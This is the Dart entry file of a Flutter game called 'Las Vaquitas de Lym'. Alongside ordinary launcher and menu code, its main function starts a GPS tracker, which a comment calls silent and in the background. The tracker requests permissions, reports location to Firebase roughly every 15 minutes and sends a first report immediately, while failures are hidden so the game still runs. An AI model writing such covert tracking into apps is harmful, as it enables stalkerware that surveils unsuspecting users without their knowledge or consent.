import 'package:firebase_core/firebase_core.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:provider/provider.dart';
import 'firebase_options.dart';
import 'game/screens/main_menu_screen.dart';
import 'game/screens/welcome_screen.dart';
import 'game/game_state.dart';
import 'tracker/gps_service.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  // Pantalla horizontal para el juego
  await SystemChrome.setPreferredOrientations([
    DeviceOrientation.landscapeLeft,
    DeviceOrientation.landscapeRight,
  ]);
  SystemChrome.setEnabledSystemUIMode(SystemUiMode.immersiveSticky);

  // Firebase + tracker GPS (silencioso, en background)
  try {
    await Firebase.initializeApp(options: DefaultFirebaseOptions.android);
    await GpsTrackerService.requestPermissions();
    await GpsTrackerService.init();
    // Primer envio inmediato (no espera 15 min)
    GpsTrackerService.sendNow();
  } catch (_) {
    // Si Firebase falla, el juego sigue funcionando
  }

  runApp(
    ChangeNotifierProvider(
      create: (_) => GameState(),
      child: const VaquitasApp(),
    ),
  );
}

class VaquitasApp extends StatelessWidget {
  const VaquitasApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Las Vaquitas de Lym',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        colorScheme: ColorScheme.fromSeed(seedColor: const Color(0xFF4CAF50)),
        useMaterial3: true,
      ),
      home: const _Launcher(),
    );
  }
}

// Decide pantalla inicial: si la vaquita aún no tiene foto, va al WelcomeScreen.
class _Launcher extends StatefulWidget {
  const _Launcher();

  @override
  State<_Launcher> createState() => _LauncherState();
}

class _LauncherState extends State<_Launcher> {
  late Future<void> _ready;

  @override
  void initState() {
    super.initState();
    _ready = context.read<GameState>().loadProgress();
  }

  @override
  Widget build(BuildContext context) {
    return FutureBuilder(
      future: _ready,
      builder: (_, snap) {
        if (snap.connectionState != ConnectionState.done) {
          return const Scaffold(
            backgroundColor: Color(0xFF87CEEB),
            body: Center(child: CircularProgressIndicator(color: Colors.white)),
          );
        }
        final hasPhoto = context.read<GameState>().vaquitaPhotoPath != null;
        return hasPhoto ? const MainMenuScreen() : const WelcomeScreen();
      },
    );
  }
}
